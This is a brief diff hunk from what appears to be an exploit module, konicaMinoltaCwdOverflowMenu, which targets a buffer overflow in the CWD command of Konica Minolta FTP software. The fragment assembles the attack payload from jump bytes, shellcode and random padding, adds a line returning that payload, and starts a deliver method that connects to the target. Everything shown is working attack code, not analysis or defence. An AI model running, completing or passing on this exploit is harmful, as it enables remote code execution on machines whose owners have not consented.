@@ -7,6 +7,7 @@ class konicaMinoltaCwdOverflowMenu(core.Exploit):
       p += "\xEB\x06b<\x9Dm \x12"
       p += self.get_shellcode()
       p += self.rand(3000)
+      return p
     def deliver(self, p):
       self.init_deliver()
       s = self.connect()
